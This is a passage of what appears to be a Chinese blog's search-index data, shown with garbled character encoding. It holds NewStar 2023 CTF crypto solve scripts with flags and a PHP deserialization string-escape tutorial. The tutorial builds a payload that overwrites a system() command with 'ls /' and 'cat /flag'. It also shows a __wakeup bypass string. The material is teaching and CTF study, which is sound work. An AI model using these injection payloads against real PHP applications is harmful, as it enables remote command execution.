2,3,4,5â€¦ï¼Œè¿™é‡Œæ–¹ä¾¿è®¡ç®—æˆ‘ä»¬å– 2\n\nè§£å¯†exp:\n\n```python\nfrom libnum import*\n\nN =  1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439\n#N = p^2*q\nd = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079\nc = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463\n\npq = gcd(pow(2,d*N,N)-2,N)\n\nm = pow(c,d,pq)\nprint(n2s(m))\n\n```\n\n#### signin[å®˜æ–¹è§£]\n\n- **è€ƒç‚¹ï¼š p-1å…‰æ»‘ï¼Œå¤šæ¬¡rabin** ï¼š\n\n- **FLAG**ï¼šflag{new1sstar_welcome_you}\n\n- **è§£é¢˜æ­¥éª¤**\n\n```python\ndef uniPrime(bits):    \n    while True:        \n        n = 2        \n        while n.bit_length() < bits:            \n            n *= choice(sieve_base)        \n        if isPrime(n + 1):            \n            return n + 1\n```\n\né˜…è¯»ä»£ç å¯çŸ¥p-1å…‰æ»‘,å¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼åˆ†è§£\n\n![image-20231106201320077](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231106201320077.png)\n\nå†æ¥çœ‹e,e=65536*3\n\nå¯ä»¥çœ‹ä½œ 2**16*3ï¼Œé‚£ä¹ˆå¯¹rabinè§£å¯†åçš„ç»“æœå†æ¬¡rabinï¼Œå…±16æ¬¡rabinè§£å¯†\n\nä»£ç å¦‚ä¸‹ï¼š\n\n```python\nfrom Crypto.Util.number import *\nN= 3326716005321175474866311915397401254111950808705576293932345690533263108414883877530294339294274914837424580618375346509555627578734883357652996005817766370804842161603027636393776079113035745495508839749006773483720698066943577445977551268093247748313691392265332970992500440422951173889419377779135952537088733\nc= 2709336316075650177079376244796188132561250459751152184677022745551914544884517324887652368450635995644019212878543745475885906864265559139379903049221765159852922264140740839538366147411533242116915892792672736321879694956051586399594206293685750573633107354109784921229088063124404073840557026747056910514218246\nimport gmpy2\na = 2\nn = 2\nwhile True:\n    a = pow(a, n, N)\n    res = gmpy2.gcd(a-1, N)\n    if res != 1 and res != N:\n        q = N // res\n        p = res\n        break\n    n += 1\nprint(2**16)\ne=65536*3\nn = p*q\nx0=gmpy2.invert(p,q)\nx1=gmpy2.invert(q,p)\ncs = [c]\nfor i in range(16):\n    ps = []\n    for c2 in cs:\n        r = pow(c2, (p + 1) // 4, p)\n        s = pow(c2, (q + 1) // 4, q)\n        x = (r * x1 * q + s * x0 * p) % n\n        y = (r * x1 * q - s * x0 * p) % n\n        if x not in ps:\n            ps.append(x)\n        if n - x not in ps:\n            ps.append(n - x)\n        if y not in ps:\n            ps.append(y)\n        if n - y not in ps:\n            ps.append(n - y)\n    cs = ps\nfor m in ps:\n    flag = long_to_bytes(gmpy2.iroot(m,3)[0])\n    print(flag)\n```\n\n\n\n> å®˜æ–¹WriteUpï¼šhttps://shimo.im/docs/gXqmdVvbOEsXpo3o/read\n\n#### BabyNRTU[å®˜æ–¹è§£]\n\n- **è€ƒç‚¹**ï¼šNTRU æ ¼æ”»å‡»åœ¨äºŒç»´çš„æƒ…å½¢\n\n- **FLAG**ï¼šflag{Lattice_reduction_magic_on_NTRU#82b08b2d}\n\n- **è§£é¢˜æ­¥éª¤**\n\n```python\nfrom Crypto.Util.number import long_to_bytes\n\n\n# h,q = (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)\n# e = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688\n\"\"\"\nfrom sage.all import *\nfrom Crypto.Util.number import long_to_bytes\nh, q = (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)\ne = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688\nM = Matrix(ZZ, [\n            [1, h],\n            [0, q]\n])\nfor v in M.LLL():\n    f, g = v\n    a = e*f % q\n    m = a * inverse_mod(f, g) % g\n    if b'flag' in long_to_bytes(m):\n        print(long_to_bytes(m)\n\n\"\"\"\nm = 240545625414656445795697416299836828697587638044418742943136404284040669983557024929358783705357829768985339005\nprint(long_to_bytes(m))\n\n```\n\n#### Smart[å®˜æ–¹è§£]\n\n- **è€ƒç‚¹**ï¼šECC Smart attackï¼ˆæ¤­åœ†æ›²çº¿trace of Frobenius = 1çš„æƒ…å½¢ï¼‰\n\n- **FLAG**ï¼šflag{m1nd_y0ur_p4rameter#167d}\n\n- **è§£é¢˜æ­¥éª¤**.\n\n```python\n\"\"\"\nè€ƒç‚¹ï¼šECC Smart attackï¼ˆæ¤­åœ†æ›²çº¿trace of Frobenius = 1çš„æƒ…å½¢ï¼‰\nFLAGï¼šflag{m1nd_y0ur_p4rameter#167d}\n# è§£é¢˜æ­¥éª¤\n\"\"\"\n\nfrom Crypto.Util.number import *\nfrom sage.all import *\ndef lift_point(E, P):\n    R = P.base_ring()\n    x, y = map(ZZ, P.xy())\n    PP = E.lift_x(x, all=True)\n    for pt in PP:\n        _, yy = map(R, pt.xy())\n        if y == yy:\n            return pt\np = 75206427479775622966537995406541077245842499523456803092204668034148875719001\na = 40399280641537685263236367744605671534251002649301968428998107181223348036480\nb = 34830673418515139976377184302022321848201537906033092355749226925568830384464\nE = EllipticCurve(GF(p), [a, b])\nG = E(63199291976729017585116731422181573663076311513240158412108878460234764025898, 11977959928854309700611217102917186587242105343137383979364679606977824228558)\nP = E(75017275378438543246214954287362349176908042127439117734318700769768512624429, 39521483276009738115474714281626894361123804837783117725653243818498259351984)\nEE = E = EllipticCurve(Qp(p), [int(a) + p * ZZ.random_element(1, p) for a in E.a_invariants()])\nx, y = map(ZZ, P.xy())\nGG = lift_point(EE, G)\nPP = lift_point(EE, P)\nGp = p * GG\nPp = p * PP\nGx, Gy = Gp.xy()\nPx, Py = Pp.xy()\nd = ZZ((Px / Py) / (Gx / Gy)) % p\n\n# d = 706900059475062772067312229965334421909675651947459433421022963709731965\nprint(long_to_bytes(d))\n```\n\n#### error[å®˜æ–¹è§£]\n\n- **è€ƒç‚¹ lwe**\n\n- **FLAG**ï¼šflag{try_lear1n_wi0h_t1e_error}\n\n- **è§£é¢˜æ­¥éª¤**\n\n```python\n\"\"\"\nè€ƒç‚¹ lwe\nFLAGï¼šflag{try_lear1n_wi0h_t1e_error}\nè§£é¢˜æ­¥éª¤\n\"\"\"\nimport re\ns2n=lambda x: [int(x) for x in re.findall(r\"\\-?\\d+\\.?\\d*\",x)]\nf=open(\"./enc.out\",\"r\").readlines()\nm = 66\nn = 200\np = 5\nq = 2^20\nB = [s2n(f[i]) for i in range(m)]\nA = [s2n(f[i+66]) for i in range(m)]\nC = [s2n(f[i+132]) for i in range(m)]\n# print(A)\n# print(B)\n# print(C)\n\nb= list(matrix(ZZ,s2n(f[-1])))\nm=A+B+C+b\nM = matrix(ZZ,m)\nL = M.LLL()\nprint(L[0])\nres=M.solve_left(L[0])\nfor i in res[:-1]:\n    print(chr(abs(i)),end=\"\")\n\n```\n\n> å®˜æ–¹WriteUpï¼šhttps://shimo.im/docs/gXqmdVvbOEsXpo3o/\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"PHPåºåˆ—åŒ–å­—ç¬¦é€ƒé€¸","url":"/PHPåºåˆ—åŒ–å­—ç¬¦é€ƒé€¸/","content":"\n## ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸\n\næ­¤ç±»é¢˜ç›®çš„æœ¬è´¨å°±æ˜¯æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´\nè¿™ç§é¢˜ç›®æœ‰ä¸ªå…±åŒç‚¹ï¼š\n\n\n\n1. phpåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç»è¿‡äº†æ›¿æ¢æˆ–è€…ä¿®æ”¹ï¼Œå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–ã€‚\n2. æ€»æ˜¯å…ˆè¿›è¡Œåºåˆ—åŒ–ï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹æ“ä½œã€‚\n\n\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\n// echo serialize($AA).\"\\n\";$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\nä»¥ä¸Šé¢ä»£ç ä¸ºä¾‹ï¼Œå¦‚ä½•åœ¨ä¸ç›´æ¥ä¿®æ”¹`$pass`å€¼çš„æƒ…å†µä¸‹é—´æ¥ä¿®æ”¹`$pass`çš„å€¼ã€‚\nè¿™æ®µä»£ç çš„æµç¨‹æ˜¯ï¼Œå…ˆåºåˆ—åŒ–ä»£ç ï¼Œç„¶åå°†é‡Œé¢ä¸å¸Œæœ›å‡ºç°çš„å­—ç¬¦bbæ›¿æ¢æˆè‡ªå®šä¹‰çš„å­—ç¬¦ä¸²cccã€‚ç„¶åè¿›è¡Œ[ååºåˆ—åŒ–](https://so.csdn.net/so/search?q=ååºåˆ—åŒ–&spm=1001.2101.3001.7020)ï¼Œæœ€åè¾“å‡ºpasså˜é‡ã€‚\n\nè¦è§£å†³ä¸Šé¢è¿™ä¸ªé—®é¢˜ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹phpåºåˆ—åŒ–ä»£ç çš„ç‰¹å¾ã€‚\n\n\n\n**O:1:\"A\":2:{s:4:\"name\";s:4:\"aaaa\";s:4:\"pass\";s:6:\"123456\";}**\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œååºåˆ—åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥`\";}`ç»“æŸçš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æŠŠ`\";}`å¸¦å…¥éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼ˆé™¤äº†ç»“å°¾å¤„ï¼‰ï¼Œå°±èƒ½è®©ååºåˆ—åŒ–æå‰é—­åˆç»“æŸï¼Œåé¢çš„å†…å®¹å°±ä¸¢å¼ƒäº†ã€‚\n**åœ¨ååºåˆ—åŒ–çš„æ—¶å€™phpä¼šæ ¹æ®sæ‰€æŒ‡å®šçš„å­—ç¬¦é•¿åº¦å»è¯»å–åè¾¹çš„å­—ç¬¦ã€‚å¦‚æœæŒ‡å®šçš„é•¿åº¦sé”™è¯¯åˆ™ååºåˆ—åŒ–å°±ä¼šå¤±è´¥ã€‚**\n\næ ¹æ®åˆšæ‰è®²çš„ï¼Œå¦‚æœæˆ‘ä»¬å°†nameå˜é‡ä¸­æ·»åŠ bbåˆ™ç¨‹åºå°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºbbå°†è¢«filterå‡½æ•°æ›¿æ¢æˆcccï¼Œcccçš„é•¿åº¦æ¯”bbå¤š1ï¼Œè¿™æ ·å‰é¢çš„sæ‰€ä»£è¡¨çš„é•¿åº¦ä¸º2ä½†æ˜¯å†…å®¹å´å˜é•¿äº†ï¼Œæˆäº†cccã€‚\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaabb';\n    public $pass='123456';\n}\n$AA=new A();\n// echo serialize($AA).\"\\n\";$res=filter(serialize($AA));\necho serialize($AA).\"\\n\";\n$res = filter(serialize($AA));\necho $res;\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n\n\n**O:1:\"A\":2:{s:4:\"name\";s:6:\"aaaabb\";s:4:\"pass\";s:6:\"123456\";}**\n\n**O:1:\"A\":2:{s:4:\"name\";s:6:\"aaaaccc\";s:4:\"pass\";s:6:\"123456\";}**\n\nå¯è§åœ¨åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²åœ¨ç»è¿‡filterå‡½æ•°è¿‡æ»¤å‰ï¼Œsä¸º6ï¼Œå†…å®¹ä¸ºaaaabbï¼›ç»è¿‡filterè¿‡æ»¤åï¼Œsä»ç„¶ä¸º6ï¼Œä½†å†…å®¹å˜ä¸ºäº†aaaacccï¼Œé•¿åº¦å˜æˆäº†7ï¼Œæ ¹æ®ååºåˆ—åŒ–è¯»å–å˜é‡çš„åŸåˆ™æ¥è®²ï¼Œæ­¤æ—¶çš„nameèƒ½è¯»å–åˆ°çš„åªæ˜¯aaaaccï¼Œæœ«å°¾å¤„çš„é‚£ä¸ªcæ˜¯è¯»å–ä¸åˆ°çš„ï¼Œè¿™å°±å½¢æˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²çš„é€ƒé€¸ã€‚å½“æˆ‘ä»¬æ·»åŠ å¤šä¸ªbbï¼Œæ¯æ·»åŠ ä¸€ä¸ªbbæˆ‘ä»¬å°±èƒ½é€ƒé€¸ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£æˆ‘ä»¬å°†é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¡«å……æˆæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ä»£ç é•¿åº¦çš„è¯é‚£å°±å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–çš„ç»“æœä»¥åŠç±»é‡Œé¢çš„å˜é‡å€¼äº†ã€‚\n\n\n\nå‡å¦‚åœ¨nameå¤„æ”¹ä¸ºï¼š`\";s:4:\"pass\";s:6:\"hacker\";}`\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='\";s:4:\"pass\";s:6:\"hacker\";}';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res = filter(serialize($AA));\necho $res;\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\nç”±äº`$name`è¢«åºåˆ—åŒ–åçš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼Œåœ¨ååºåˆ—åŒ–å`$name`ä»ç„¶ä¸º`\";s:4:\"pass\";s:6:\"hacker\";}`ï¼Œ`$pass`ä»ç„¶ä¸º`123456`ï¼š\n\n**O:1:\"A\":2:{s:4:\"name\";`s:27:\"\";s:4:\"pass\";s:6:\"hacker\";}\"`;s:4:\"pass\";s:6:\"123456\";}**\n\nå…³é”®ç‚¹åœ¨äºfilterå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ£€æµ‹å¹¶æ›¿æ¢äº†éæ³•å­—ç¬¦ä¸²ï¼Œçœ‹ä¼¼å¢åŠ äº†ä»£ç çš„å®‰å…¨ç³»æ•°ï¼Œå®åˆ™è®©æ•´æ®µä»£ç æ›´åŠ å±é™©ã€‚filterå‡½æ•°ä¸­æ£€æµ‹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ£€æµ‹åˆ°äº†éæ³•å­—ç¬¦'bb'ï¼Œå°±æŠŠå®ƒæ›¿æ¢ä¸º'ccc'ã€‚\næ­¤æ—¶æˆ‘ä»¬å‘ç°\";s:4:\"pass\";s:6:\"hacker\";}çš„é•¿åº¦ä¸º27ï¼Œå¦‚æœæˆ‘ä»¬å†åŠ ä¸Š27ä¸ªbbï¼Œé‚£æœ€ç»ˆçš„é•¿åº¦å°†å¢åŠ 27ï¼Œä¸å°±èƒ½é€ƒé€¸åé¢çš„\";s:4:\"pass\";s:6:\"hacker\";}äº†å—ï¼Ÿå¦‚ä¸‹ï¼š\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";}';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res = filter(serialize($AA));\necho $res.\"\\n\";\n$c=unserialize($res);\nprint_r($c).\"\\n\";\necho $c->pass;\n?>\n```\n\nè¿è¡Œç»“æœï¼š\n\n```php\nO:1:\"A\":2:{s:4:\"name\";s:81:\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";}\";s:4:\"pass\";s:6:\"123456\";}\nO:1:\"A\":2:{s:4:\"name\";s:81:\"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\";s:4:\"pass\";s:6:\"hacker\";}\";s:4:\"pass\";s:6:\"123456\";}\nA Object\n(\n    [name] => ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\n    [pass] => hacker\n)\nhacker\n```\n\næ­¤æ—¶ï¼ŒæˆåŠŸé€ƒé€¸ï¼Œä¿®æ”¹äº†passçš„å€¼\n\nå¡«å……çš„27ä¸ªbbï¼Œåœ¨ç»è¿‡filterå‡½æ•°è¿‡æ»¤åä¼šå¢åŠ 27ä¸ªå­—ç¬¦çš„é•¿åº¦ï¼Œè¿™27ä¸ªå­—ç¬¦ä¼šå¡«å……å½“å‰payloadå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œpayloadåˆ™é¡ºåˆ©çš„é€ƒé€¸å¤„äº†phpååºåˆ—åŒ–ä¸­sçš„æ£€æŸ¥\n\nè¢«é€ƒé€¸å‡ºçš„payloadä¼šè¢«å½“æˆå½“å‰ç±»çš„å±æ€§ç»§ç»­æ‰§è¡Œ`\";s:4:\"pass\";s:6:\"hacker\";}`ï¼Œè€Œåä¸€éƒ¨åˆ†ç”±äºå‰é¢çš„payloadå·²ç»æ„æˆäº†é—­åˆï¼Œæ‰€ä»¥ä¸åœ¨æ‰§è¡Œ\n\n#### [NewStar2023 week4]é€ƒ\n\né¢˜ç›®ï¼š\n\n```php\n <?php\nhighlight_file(__FILE__);\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key;\n    public $cmd = \"whoami\";\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n    public function __destruct()\n    {\n        system($this->cmd);\n    }\n}\n\nunserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data \n```\n\n**ç»å…¸çš„phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸**\n\né¦–å…ˆæ„é€ åºåˆ—åŒ–ä»£ç ï¼š\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='bad';   \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:4:\"ls /\";}`\n\næˆ‘ä»¬éœ€è¦é€ƒé€¸çš„æ˜¯`\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:24:\"\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}`\n\næ€»å…±24ä¸ªå­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬å†™24ä¸ªbadå°±è¡Œ\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n\n$res = waf(serialize($a));\necho $res.\"\\n\";\n\n$c = unserialize($res);\nprint_r($c).\"\\n\";\necho $c->cmd;\n```\n\nè¿è¡Œç»“æœï¼š\n\n```php\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nGetFlag Object\n(\n    [key] => goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\n    [cmd] => ls /\n)\nls /\n```\n\npayloadï¼š\n\n`key = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\" `\n\n![image-20231030150507471](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150507471.png)\n\næ¥ç€æ„é€ payloadæŸ¥çœ‹flag\n\n`/?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";}`\n\n![image-20231030150810755](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150810755.png)\n\n\n\n","tags":["PHP","åºåˆ—åŒ–","ååºåˆ—åŒ–","å­—ç¬¦é€ƒé€¸"],"categories":["PHP"]},{"title":"PHPåºåˆ—åŒ–åŸºç¡€çŸ¥è¯†","url":"/PHPåºåˆ—åŒ–åŸºç¡€çŸ¥è¯†/","content":"\n## åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¦‚å¿µ\n\nåºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²åŒ…æ‹¬ å±æ€§å å±æ€§å€¼ å±æ€§ç±»å‹å’Œè¯¥å¯¹è±¡å¯¹åº”çš„ç±»åã€‚\n ååºåˆ—åŒ–åˆ™ç›¸åå°†å­—ç¬¦ä¸²é‡æ–°æ¢å¤æˆå¯¹è±¡ã€‚\n å¯¹è±¡çš„åºåˆ—åŒ–åˆ©äºå¯¹è±¡çš„ä¿å­˜å’Œä¼ è¾“,ä¹Ÿå¯ä»¥è®©å¤šä¸ªæ–‡ä»¶å…±äº«å¯¹è±¡ã€‚\n\n## åºåˆ—åŒ–ä¸­å¸¸è§çš„é­”æ³•å‡½æ•°ï¼š\n\n```scss\n__construct() åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨\n__destruct() é”€æ¯å¯¹è±¡æ—¶è°ƒç”¨\n__toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨\n__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ\n__wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨\n```\n\n![image-20231024142146721](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024142146721.png)\n\n#### çœ‹ä¸€ä¸²å­—ç¬¦ä¸²\n\n```php\nO:3:\"Ctf\":3{s:4:\"flag\";s:13:\"flag{abedyui}\";s:4:\"name\";s:7:\"Sch0lar\";s:3:\"age\";s:2:\"18\";}\n\nOä»£è¡¨å¯¹è±¡ å› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ åºåˆ—åŒ–æ•°ç»„åˆ™ç”¨Aæ¥è¡¨ç¤º\n3 ä»£è¡¨ç±»åå­—å ä¸‰ä¸ªå­—ç¬¦ \nctf ç±»å\n3 ä»£è¡¨ä¸‰ä¸ªå±æ€§\nsä»£è¡¨å­—ç¬¦ä¸²\n4ä»£è¡¨å±æ€§åé•¿åº¦\nflagå±æ€§å\ns:13:\"flag{abedyui}\" å­—ç¬¦ä¸² å±æ€§å€¼é•¿åº¦ å±æ€§å€¼\n```\n\n#### è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦\n\næ ¹æ®è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦çš„ä¸åŒ åºåˆ—åŒ–åçš„ å±æ€§é•¿åº¦å’Œå±æ€§å€¼ä¼šæœ‰æ‰€ä¸åŒ,æ‰€ä»¥è¿™é‡Œç®€å•æä¸€ä¸‹\n\n```scss\npublic(å…¬æœ‰)\nprotected(å—ä¿æŠ¤)\nprivate(ç§æœ‰çš„)\nprotectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§å\nprivateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00ç±»å%00å±æ€§å\n```\n\nå°±åƒè¿™æ ·\n\n```php\nO:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}//è¿™é‡Œæ˜¯privateå±æ€§è¢«åºåˆ—åŒ–\n```\n\n#### ç»•è¿‡__wakeup()å‡½æ•°\n\nå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚\n\n```php\n//å°†ä¸Šé¢çš„å¯¹è±¡å±æ€§ä¸ªæ•°å€¼æ”¹æˆé€¼çœŸå®ä¸ªæ•°æ‰“\nO:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n##### [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP\n\n```php\n<?php\ninclude 